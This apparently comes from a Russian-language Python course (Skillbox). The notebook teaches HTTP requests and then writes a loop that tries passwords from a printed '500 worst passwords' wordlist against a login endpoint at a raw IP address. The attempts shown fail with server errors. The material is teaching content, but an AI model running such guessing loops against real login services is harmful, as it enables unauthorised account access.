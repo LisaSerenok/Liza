{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOcAOEvnF5PrQDWYhL8taVf",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/LisaSerenok/Liza/blob/main/Skillbox_1.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hR8-MqmMjXxo",
        "outputId": "69e44a56-371a-4981-91cb-440aa665c7a6"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Python реально работает\n"
          ]
        }
      ],
      "source": [
        "print(\"Python реально работает\")"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# HTTP\n",
        "import requests\n",
        "url=\"http://34.88.133.100/api/login-with-password\"\n",
        "payload={\"login\":\"mike\",\"password\":\"1234\"}\n",
        "\n",
        "# GET - получение данных\n",
        "# POST - Изменение данных\n",
        "result = requests.post(url,payload)\n"
      ],
      "metadata": {
        "id": "Pt75C1m7kkHD"
      },
      "execution_count": 1,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#2** = ok\n",
        "# 3** = redirect\n",
        "#4** = ошибка клиента\n",
        "#5** = ошибка сервера\n",
        "result.status_code"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "1vuZipLjWAVi",
        "outputId": "652a4161-fb08-44e4-e110-ad509c5e915b"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "200"
            ]
          },
          "metadata": {},
          "execution_count": 2
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "См. справку в MDN"
      ],
      "metadata": {
        "id": "BS83QUucXAY5"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Content-Type: тип содержимого\n",
        "result.headers[\"Content-Type\"]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 36
        },
        "id": "9BhVJ7-zWhXb",
        "outputId": "026ddd25-4be4-47e5-9669-e98c96e90fdf"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'application/json'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 5
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "result.headers"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YWcNCnZvXxYm",
        "outputId": "372add60-ef83-4ebf-c998-a04142d4e374"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'Content-Type': 'application/json', 'Content-Length': '22', 'Server': 'Werkzeug/2.0.3 Python/3.6.9', 'Date': 'Wed, 30 Nov 2022 16:21:34 GMT'}"
            ]
          },
          "metadata": {},
          "execution_count": 6
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "result.json()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xJjYAmUmXXTg",
        "outputId": "eb494734-03b6-445f-a921-bebc61ed0154"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'result': False}"
            ]
          },
          "metadata": {},
          "execution_count": 4
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "login = \"skillbox\"\n",
        "password_list = [\n",
        "    \"pussy\",\n",
        "    \"12345\",\n",
        "    \"dragon\",\n",
        "    \"qwerty\",\n",
        "    \"696969\",\n",
        "    \"mike2022\"\n",
        "]\n",
        "for pswd in password_list:\n",
        "  #print(f\"А правда ли, что {pswd} - это самый безопастный пароль?\")\n",
        "  payload = {\"login\":\"skillbox\",\"password\":pswd}\n",
        "  print(f\"Trying payload{payload}\", end =\"\") \n",
        "  pswd_try= requests.post(url,payload) #pswd_try - это результат запроса\n",
        "  if pswd_try.status_code !=200:\n",
        "    print(f\"Status code is not ok: {pswd_try.status_code}\")\n",
        "  json = pswd_try.json()\n",
        "  auth_result = json[\"result\"] #True/False\n",
        "  if auth_result: #Пароль подошел \n",
        "    print(\"Success!\")\n",
        "    break\n",
        "  else:\n",
        "    print(\"nope.\")\n",
        "\n",
        "  #БАН"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 397
        },
        "id": "7pHQ9e4RYQ_M",
        "outputId": "e6a8c5c9-8bd1-4f91-abb7-40831202a0d9"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Trying payload{'login': 'skillbox', 'password': 'pussy'}Status code is not ok: 500\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "JSONDecodeError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mJSONDecodeError\u001b[0m                           Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-20-54cf13bf5abe>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     15\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0mpswd_try\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstatus_code\u001b[0m \u001b[0;34m!=\u001b[0m\u001b[0;36m200\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     16\u001b[0m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Status code is not ok: {pswd_try.status_code}\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 17\u001b[0;31m   \u001b[0mjson\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpswd_try\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjson\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     18\u001b[0m   \u001b[0mauth_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mjson\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m\"result\"\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;31m#True/False\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     19\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0mauth_result\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;31m#Пароль подошел\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/requests/models.py\u001b[0m in \u001b[0;36mjson\u001b[0;34m(self, **kwargs)\u001b[0m\n\u001b[1;32m    896\u001b[0m                     \u001b[0;31m# used.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    897\u001b[0m                     \u001b[0;32mpass\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 898\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mcomplexjson\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mloads\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    899\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    900\u001b[0m     \u001b[0;34m@\u001b[0m\u001b[0mproperty\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.7/json/__init__.py\u001b[0m in \u001b[0;36mloads\u001b[0;34m(s, encoding, cls, object_hook, parse_float, parse_int, parse_constant, object_pairs_hook, **kw)\u001b[0m\n\u001b[1;32m    346\u001b[0m             \u001b[0mparse_int\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mparse_float\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m \u001b[0;32mand\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    347\u001b[0m             parse_constant is None and object_pairs_hook is None and not kw):\n\u001b[0;32m--> 348\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0m_default_decoder\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    349\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mcls\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    350\u001b[0m         \u001b[0mcls\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mJSONDecoder\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.7/json/decoder.py\u001b[0m in \u001b[0;36mdecode\u001b[0;34m(self, s, _w)\u001b[0m\n\u001b[1;32m    335\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    336\u001b[0m         \"\"\"\n\u001b[0;32m--> 337\u001b[0;31m         \u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraw_decode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0midx\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0m_w\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    338\u001b[0m         \u001b[0mend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_w\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    339\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mend\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.7/json/decoder.py\u001b[0m in \u001b[0;36mraw_decode\u001b[0;34m(self, s, idx)\u001b[0m\n\u001b[1;32m    353\u001b[0m             \u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mscan_once\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0midx\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    354\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mStopIteration\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0merr\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 355\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mJSONDecodeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Expecting value\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0merr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalue\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    356\u001b[0m         \u001b[0;32mreturn\u001b[0m \u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mJSONDecodeError\u001b[0m: Expecting value: line 1 column 1 (char 0)"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "with open(\"/500-worst-passwords.txt\", \"r\") as pswd_file:\n",
        "  lines=pswd_file.readlines() \n",
        "  #print(pswd_file.readlines())\n",
        "  passwords=[line.strip() for line in lines]\n",
        "  print(passwords)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "94aQ8xgaoG6N",
        "outputId": "2a36a1c2-e83d-48bd-feaa-8b611fc77cb0"
      },
      "execution_count": 19,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "['123456', 'password', '12345678', '1234', 'pussy', '12345', 'dragon', 'qwerty', '696969', 'mustang', 'letmein', 'baseball', 'master', 'michael', 'football', 'shadow', 'monkey', 'abc123', 'pass', 'fuckme', '6969', 'jordan', 'harley', 'ranger', 'iwantu', 'jennifer', 'hunter', 'fuck', '2000', 'test', 'batman', 'trustno1', 'thomas', 'tigger', 'robert', 'access', 'love', 'buster', '1234567', 'soccer', 'hockey', 'killer', 'george', 'sexy', 'andrew', 'charlie', 'superman', 'asshole', 'fuckyou', 'dallas', 'jessica', 'panties', 'pepper', '1111', 'austin', 'william', 'daniel', 'golfer', 'summer', 'heather', 'hammer', 'yankees', 'joshua', 'maggie', 'biteme', 'enter', 'ashley', 'thunder', 'cowboy', 'silver', 'richard', 'fucker', 'orange', 'merlin', 'michelle', 'corvette', 'bigdog', 'cheese', 'matthew', '121212', 'patrick', 'martin', 'freedom', 'ginger', 'blowjob', 'nicole', 'sparky', 'yellow', 'camaro', 'secret', 'dick', 'falcon', 'taylor', '111111', '131313', '123123', 'bitch', 'hello', 'scooter', 'please', 'porsche', 'guitar', 'chelsea', 'black', 'diamond', 'nascar', 'jackson', 'cameron', '654321', 'computer', 'amanda', 'wizard', 'xxxxxxxx', 'money', 'phoenix', 'mickey', 'bailey', 'knight', 'iceman', 'tigers', 'purple', 'andrea', 'horny', 'dakota', 'aaaaaa', 'player', 'sunshine', 'morgan', 'starwars', 'boomer', 'cowboys', 'edward', 'charles', 'girls', 'booboo', 'coffee', 'xxxxxx', 'bulldog', 'ncc1701', 'rabbit', 'peanut', 'john', 'johnny', 'gandalf', 'spanky', 'winter', 'brandy', 'compaq', 'carlos', 'tennis', 'james', 'mike', 'brandon', 'fender', 'anthony', 'blowme', 'ferrari', 'cookie', 'chicken', 'maverick', 'chicago', 'joseph', 'diablo', 'sexsex', 'hardcore', '666666', 'willie', 'welcome', 'chris', 'panther', 'yamaha', 'justin', 'banana', 'driver', 'marine', 'angels', 'fishing', 'david', 'maddog', 'hooters', 'wilson', 'butthead', 'dennis', 'fucking', 'captain', 'bigdick', 'chester', 'smokey', 'xavier', 'steven', 'viking', 'snoopy', 'blue', 'eagles', 'winner', 'samantha', 'house', 'miller', 'flower', 'jack', 'firebird', 'butter', 'united', 'turtle', 'steelers', 'tiffany', 'zxcvbn', 'tomcat', 'golf', 'bond007', 'bear', 'tiger', 'doctor', 'gateway', 'gators', 'angel', 'junior', 'thx1138', 'porno', 'badboy', 'debbie', 'spider', 'melissa', 'booger', '1212', 'flyers', 'fish', 'porn', 'matrix', 'teens', 'scooby', 'jason', 'walter', 'cumshot', 'boston', 'braves', 'yankee', 'lover', 'barney', 'victor', 'tucker', 'princess', 'mercedes', '5150', 'doggie', 'zzzzzz', 'gunner', 'horney', 'bubba', '2112', 'fred', 'johnson', 'xxxxx', 'tits', 'member', 'boobs', 'donald', 'bigdaddy', 'bronco', 'penis', 'voyager', 'rangers', 'birdie', 'trouble', 'white', 'topgun', 'bigtits', 'bitches', 'green', 'super', 'qazwsx', 'magic', 'lakers', 'rachel', 'slayer', 'scott', '2222', 'asdf', 'video', 'london', '7777', 'marlboro', 'srinivas', 'internet', 'action', 'carter', 'jasper', 'monster', 'teresa', 'jeremy', '11111111', 'bill', 'crystal', 'peter', 'pussies', 'cock', 'beer', 'rocket', 'theman', 'oliver', 'prince', 'beach', 'amateur', '7777777', 'muffin', 'redsox', 'star', 'testing', 'shannon', 'murphy', 'frank', 'hannah', 'dave', 'eagle1', '11111', 'mother', 'nathan', 'raiders', 'steve', 'forever', 'angela', 'viper', 'ou812', 'jake', 'lovers', 'suckit', 'gregory', 'buddy', 'whatever', 'young', 'nicholas', 'lucky', 'helpme', 'jackie', 'monica', 'midnight', 'college', 'baby', 'cunt', 'brian', 'mark', 'startrek', 'sierra', 'leather', '232323', '4444', 'beavis', 'bigcock', 'happy', 'sophie', 'ladies', 'naughty', 'giants', 'booty', 'blonde', 'fucked', 'golden', '0', 'fire', 'sandra', 'pookie', 'packers', 'einstein', 'dolphins', 'chevy', 'winston', 'warrior', 'sammy', 'slut', '8675309', 'zxcvbnm', 'nipples', 'power', 'victoria', 'asdfgh', 'vagina', 'toyota', 'travis', 'hotdog', 'paris', 'rock', 'xxxx', 'extreme', 'redskins', 'erotic', 'dirty', 'ford', 'freddy', 'arsenal', 'access14', 'wolf', 'nipple', 'iloveyou', 'alex', 'florida', 'eric', 'legend', 'movie', 'success', 'rosebud', 'jaguar', 'great', 'cool', 'cooper', '1313', 'scorpio', 'mountain', 'madison', '987654', 'brazil', 'lauren', 'japan', 'naked', 'squirt', 'stars', 'apple', 'alexis', 'aaaa', 'bonnie', 'peaches', 'jasmine', 'kevin', 'matt', 'qwertyui', 'danielle', 'beaver', '4321', '4128', 'runner', 'swimming', 'dolphin', 'gordon', 'casper', 'stupid', 'shit', 'saturn', 'gemini', 'apples', 'august', '3333', 'canada', 'blazer', 'cumming', 'hunting', 'kitty', 'rainbow', '112233', 'arthur', 'cream', 'calvin', 'shaved', 'surfer', 'samson', 'kelly', 'paul', 'mine', 'king', 'racing', '5555', 'eagle', 'hentai', 'newyork', 'little', 'redwings', 'smith', 'sticky', 'cocacola', 'animal', 'broncos', 'private', 'skippy', 'marvin', 'blondes', 'enjoy', 'girl', 'apollo', 'parker', 'qwert', 'time', 'sydney', 'women', 'voodoo', 'magnum', 'juice', 'abgrtyu', '777777', 'dreams', 'maxwell', 'music', 'rush2112', 'russia', 'scorpion', 'rebecca', 'tester', 'mistress', 'phantom', 'billy', '6666', 'albert']\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Новый раздел"
      ],
      "metadata": {
        "id": "lVD2diy3rt67"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "with open(\"/500-worst-passwords.txt\", \"r\") as pswd_file:\n",
        "  lines=pswd_file.readlines() \n",
        "  #print(pswd_file.readlines())\n",
        "  password_list=[line.strip() for line in lines]\n",
        "\n",
        "\n",
        "for pswd in password_list:\n",
        "  #print(f\"А правда ли, что {pswd} - это самый безопастный пароль?\")\n",
        "  payload = {\"login\":\"skillbox\",\"password\":pswd}\n",
        "  print(f\"Trying payload{payload}\", end =\"\") \n",
        "  pswd_try= requests.post(url,payload) #pswd_try - это результат запроса\n",
        "  if pswd_try.status_code !=200:\n",
        "    print(f\"Status code is not ok: {pswd_try.status_code}\")\n",
        "  json = pswd_try.json()\n",
        "  auth_result = json[\"result\"] #True/False\n",
        "  if auth_result: #Пароль подошел \n",
        "    print(\"Success!\")\n",
        "    break\n",
        "  else:\n",
        "    print(\"nope.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 397
        },
        "id": "dVI-yrujrw90",
        "outputId": "2699e51e-aab5-4c3f-e7db-70c28261f280"
      },
      "execution_count": 21,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Trying payload{'login': 'skillbox', 'password': '123456'}Status code is not ok: 500\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "JSONDecodeError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mJSONDecodeError\u001b[0m                           Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-21-8891ba6545ca>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     12\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0mpswd_try\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstatus_code\u001b[0m \u001b[0;34m!=\u001b[0m\u001b[0;36m200\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     13\u001b[0m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Status code is not ok: {pswd_try.status_code}\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 14\u001b[0;31m   \u001b[0mjson\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpswd_try\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjson\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     15\u001b[0m   \u001b[0mauth_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mjson\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m\"result\"\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;31m#True/False\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     16\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0mauth_result\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;31m#Пароль подошел\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/requests/models.py\u001b[0m in \u001b[0;36mjson\u001b[0;34m(self, **kwargs)\u001b[0m\n\u001b[1;32m    896\u001b[0m                     \u001b[0;31m# used.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    897\u001b[0m                     \u001b[0;32mpass\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 898\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mcomplexjson\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mloads\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    899\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    900\u001b[0m     \u001b[0;34m@\u001b[0m\u001b[0mproperty\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.7/json/__init__.py\u001b[0m in \u001b[0;36mloads\u001b[0;34m(s, encoding, cls, object_hook, parse_float, parse_int, parse_constant, object_pairs_hook, **kw)\u001b[0m\n\u001b[1;32m    346\u001b[0m             \u001b[0mparse_int\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mparse_float\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m \u001b[0;32mand\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    347\u001b[0m             parse_constant is None and object_pairs_hook is None and not kw):\n\u001b[0;32m--> 348\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0m_default_decoder\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    349\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mcls\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    350\u001b[0m         \u001b[0mcls\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mJSONDecoder\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.7/json/decoder.py\u001b[0m in \u001b[0;36mdecode\u001b[0;34m(self, s, _w)\u001b[0m\n\u001b[1;32m    335\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    336\u001b[0m         \"\"\"\n\u001b[0;32m--> 337\u001b[0;31m         \u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraw_decode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0midx\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0m_w\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    338\u001b[0m         \u001b[0mend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_w\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    339\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mend\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0ms\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
